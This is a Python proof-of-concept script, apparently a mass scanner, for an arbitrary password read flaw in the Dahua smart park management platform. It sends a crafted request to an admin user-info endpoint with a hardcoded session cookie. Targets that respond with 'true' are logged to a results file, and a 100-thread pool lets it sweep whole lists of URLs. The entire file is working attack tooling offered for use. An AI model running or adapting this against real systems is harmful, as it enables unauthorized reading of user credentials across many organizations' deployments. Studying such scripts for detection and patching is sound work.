import argparse,sys,requests,time,os,re
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()  #校验证书错误时防止报错

# 指纹模板
def banner():
    test = """
    ·▄▄▄▄   ▄ .▄     ▄▄▄· ▄▄▄· .▄▄ · .▄▄ · ▄▄▌ ▐ ▄▌·▄▄▄▄  ▄▄▄  ▄▄▄ . ▄▄▄· ·▄▄▄▄  
██▪ ██ ██▪▐█    ▐█ ▄█▐█ ▀█ ▐█ ▀. ▐█ ▀. ██· █▌▐███▪ ██ ▀▄ █·▀▄.▀·▐█ ▀█ ██▪ ██ 
▐█· ▐█▌██▀▐█     ██▀·▄█▀▀█ ▄▀▀▀█▄▄▀▀▀█▄██▪▐█▐▐▌▐█· ▐█▌▐▀▀▄ ▐▀▀▪▄▄█▀▀█ ▐█· ▐█▌
██. ██ ██▌▐▀    ▐█▪·•▐█ ▪▐▌▐█▄▪▐█▐█▄▪▐█▐█▌██▐█▌██. ██ ▐█•█▌▐█▄▄▌▐█ ▪▐▌██. ██ 
▀▀▀▀▀• ▀▀▀ ·    .▀    ▀  ▀  ▀▀▀▀  ▀▀▀▀  ▀▀▀▀ ▀▪▀▀▀▀▀• .▀  ▀ ▀▀▀  ▀  ▀ ▀▀▀▀▀• 
                                                    @author: 赵卿
    """
    print(test)

# 检测模板
def poc(target):
    url = target + "/admin/user_getUserInfoByUserName.action"
    headers = {
        "User - Agent": "Mozilla / 5.0(Windows NT 10.0;Win64;x64) AppleWebKit / 537.36(KHTML, likeGecko) Chrome / 119.0.0.0Safari / 537.36Edg / 119.0.0.0",
        "Cookie": "JSESSIONID = 6B55B276A6BAD63FD164AAD447EDE848"
    }
    try:
        res = requests.get(url=url,headers=headers).text
        # print(res)
        if "true" in res:
            print(f"[+] {target} 存在任意密码读取")
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(target + "存在任意密码读取\n")
        else:
            print(f"[-] {target} 不存在任意密码读取")
    except Exception as e:
        print(e)

# 主函数模块
def main():
    banner()
    """命令行接收参数"""
    parser = argparse.ArgumentParser(description='大华智慧园区管理平台任意密码读取')
    # -u 单个检测  -f 多行检测
    parser.add_argument('-u', '--url', dest='url', type=str, help='输入URL')
    parser.add_argument('-f', '--file', dest='file', type=str, help='输入文件夹')
    # 调用
    args = parser.parse_args()
    # 处理命令行参数
    # 循环判断
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usaq:\n\t python3 {sys.argv[0]} -h")


# 主函数入口
if __name__ == '__main__':
    main()











